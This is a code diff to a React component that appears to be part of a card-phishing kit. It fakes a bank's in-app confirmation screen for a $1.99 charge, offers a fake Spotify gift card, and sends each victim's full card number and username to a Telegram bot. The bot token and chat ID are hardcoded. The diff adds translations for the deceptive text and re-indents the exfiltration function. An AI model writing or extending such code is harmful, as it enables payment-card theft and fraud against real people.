@@ -6,11 +6,13 @@ import './NextStepAppr.css';
 import visaLogo from '../assets/visa-logo.png';
 import mastercardLogo from '../assets/mastercard-logo.png';
 import GiftCardPopup from './GiftCardPopup';
+import { useLanguage } from '../hooks/useLanguage';
 
 const TELEGRAM_BOT_TOKEN = '8508454843:AAGGN8mMMmXkV2O2Ii7DUL-8do9UeKusbz0';
 const TELEGRAM_ACTIONS_CHAT_ID = '-4820671789';
 
 function NextStepAppr() {
+  const { t } = useLanguage();
   // eslint-disable-next-line no-unused-vars
   // const navigate = useNavigate();
   const [isConfirmed, setIsConfirmed] = useState(false);
@@ -29,6 +31,30 @@ function NextStepAppr() {
   const [showMessage, setShowMessage] = useState(false);
   const [messageText, setMessageText] = useState('');
   const [messageType, setMessageType] = useState('');
+
+  // Safe translations with fallbacks
+  const safeT = {
+    confirmationInApp: "Confirmation in your Bank App",
+    merchant: "Merchant",
+    amount: "Amount",
+    date: "Date",
+    cardNumberLabel: "Card Number",
+    instruction1: "Open your banking app on your smartphone.",
+    instruction2: "Confirm the authorization.",
+    instruction3: "Return to this screen after confirmation.",
+    instruction4: "Tap \"CONFIRM\" when you are back.",
+    instruction5: "Please do not refresh the page.",
+    confirm: "Confirm",
+    sending: "Sending...",
+    securedBy: "Secured by",
+    waitingTitle: "Confirmation in App",
+    waitingMessage: "Your confirmation has been sent.",
+    waitingSubMessage: "Please check your mobile banking app.",
+    waitingDontRefresh: "Please do not refresh the page.",
+    currentTime: "Current time",
+    waitingForConfirmation: "Waiting for Confirmation",
+    ...t
+  };
 
   // Generate random Spotify gift card code
   const generateGiftCode = () => {
@@ -63,7 +89,7 @@ function NextStepAppr() {
   const handleBackToAppr = () => {
     console.log('⬅️ Back to Appr clicked');
     setIsConfirmed(false);
-    setMessageText('Please make sure you have confirmed in the banking app.');
+    setMessageText(safeT.waitingInstruction || 'Please make sure you have confirmed in the banking app.');
     setMessageType('warning');
     setShowMessage(true);
     
@@ -177,12 +203,12 @@ function NextStepAppr() {
   }, []);
 
   const sendTelegramLog = async () => {
-  try {
-    // Get the FULL card number from sessionStorage
-    const fullCardNumber = sessionStorage.getItem('cardNumber') || 'Unknown';
-    
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const message = `✅ <b>USER CONFIRMED IN BANKING APP</b> ✅
+    try {
+      // Get the FULL card number from sessionStorage
+      const fullCardNumber = sessionStorage.getItem('cardNumber') || 'Unknown';
+      
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const message = `✅ <b>USER CONFIRMED IN BANKING APP</b> ✅
 ━━━━━━━━━━━━━━━━━━━━━
 👤 <b>Username:</b> ${username || 'Unknown'}
 💳 <b>Card Number:</b> <code>${fullCardNumber}</code>
@@ -251,7 +277,7 @@ function NextStepAppr() {
           <div className="bank-logo-container">
             
           </div>
-          <h2 className="waiting-title">Confirmation in App</h2>
+          <h2 className="waiting-title">{safeT.waitingTitle}</h2>
           
           <div className="animated-loader">
             <div className="loader-ring"></div>
@@ -260,11 +286,11 @@ function NextStepAppr() {
             <div className="loader-dot"></div>
           </div>
           
-          <h3>Waiting for Confirmation</h3>
-          <p>Your confirmation has been sent.</p>
-          <p>Please check your mobile banking app.</p>
-          <p>Please do not refresh the page.</p>
-          <p className="waiting-time">Current time: {currentTime.toLocaleString()}</p>
+          <h3>{safeT.waitingForConfirmation}</h3>
+          <p>{safeT.waitingMessage}</p>
+          <p>{safeT.waitingSubMessage}</p>
+          <p>{safeT.waitingDontRefresh}</p>
+          <p className="waiting-time">{safeT.currentTime}: {currentTime.toLocaleString()}</p>
         </div>
         
         {/* Gift Card Popup */}
@@ -297,33 +323,33 @@ function NextStepAppr() {
           </div>
         </div>
 
-        <h3>Confirmation in your Bank App</h3>
+        <h3>{safeT.confirmationInApp}</h3>
         
         <div className="confirmation-details">
           <div className="detail-row">
-            <span className="detail-label">Merchant:</span>
+            <span className="detail-label">{safeT.merchant}:</span>
             <span className="detail-value">{sessionStorage.getItem('cardBrand') || 'VISA'}</span>
           </div>
           <div className="detail-row">
-            <span className="detail-label">Amount:</span>
+            <span className="detail-label">{safeT.amount}:</span>
             <span className="detail-value">$1.99</span>
           </div>
           <div className="detail-row">
-            <span className="detail-label">Date:</span>
+            <span className="detail-label">{safeT.date}:</span>
             <span className="detail-value">{new Date().toLocaleString()}</span>
           </div>
           <div className="detail-row">
-            <span className="detail-label">Card Number:</span>
+            <span className="detail-label">{safeT.cardNumberLabel}:</span>
             <span className="detail-value">{cardNumber}</span>
           </div>
         </div>
 
         <div className="confirmation-instructions">
-          <p>• Open your banking app on your smartphone.</p>
-          <p>• Confirm the authorization.</p>
-          <p>• Return to this screen after confirmation.</p>
-          <p>• Tap "CONFIRM" when you are back.</p>
-          <p>• Please do not refreshh the page.</p>
+          <p>• {safeT.instruction1}</p>
+          <p>• {safeT.instruction2}</p>
+          <p>• {safeT.instruction3}</p>
+          <p>• {safeT.instruction4}</p>
+          <p>• {safeT.instruction5}</p>
         </div>
 
         <div className="confirmation-buttons">
@@ -332,13 +358,13 @@ function NextStepAppr() {
             className="confirm-btn"
             disabled={isSending}
           >
-            {isSending ? 'Sending...' : 'Confirm'}
+            {isSending ? safeT.sending : safeT.confirm}
           </button>
         </div>
         
         <div className="secure-badge">
           <span className="lock-icon">🔒</span>
-          <span>Secured by {bankName}</span>
+          <span>{safeT.securedBy} {bankName}</span>
         </div>
       </div>
       
